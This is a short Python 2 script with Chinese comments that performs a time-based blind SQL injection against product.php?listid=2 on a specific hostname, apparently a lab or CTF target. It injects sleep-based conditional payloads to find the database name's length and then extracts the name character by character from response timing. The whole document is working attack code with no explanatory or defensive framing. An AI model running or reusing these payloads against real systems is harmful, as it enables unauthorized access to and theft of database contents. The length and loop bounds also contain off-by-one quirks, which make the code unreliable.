# coding:utf-8
import requests
import datetime
import time

# 获取数据库名长度
#http://110002-gesxg35f.wlz.com/product.php?listid=2 and if(length(database())=6,sleep(3),1)

def database_len():
    for i in range(1, 28):
        url = 'http://110002-gesxg35f.wlz.com/product.php'
        payload = '''?listid=2 and if(length(database())=%s,sleep(3),1)''' % i
    
        time1 = datetime.datetime.now()
        r = requests.get(url + payload + '--')
        print r.text
        time2 = datetime.datetime.now()
        print time1
        print time2
        sec = (time2 - time1).seconds
        print sec
        if sec < 3:
            print(url+payload+'--')
        else:
            print(url+payload+'--')
            break
            
    print('database_len:', i-1)
    return i-1

#获取数据库名
def database_name(database_length):
    name = ''
    for j in range(1, database_length):
        for i in range(1, 255):
            url = '''http://110002-gesxg35f.wlz.com/product.php'''
            payload = '''?listid=2 and if(ascii(substr(database(),%s,1))=%s,sleep(3),1)''' % (j,i)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload + '--')
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec < 3:
                print(url+payload+'--')
            else:
                name += chr(i)
                print(url+payload+'--')
                print(name)
                break
    print('database_name:', name)

def main():
    database_length=database_len()
    #database_name(database_length+1)
    
if __name__ == '__main__':
    main()









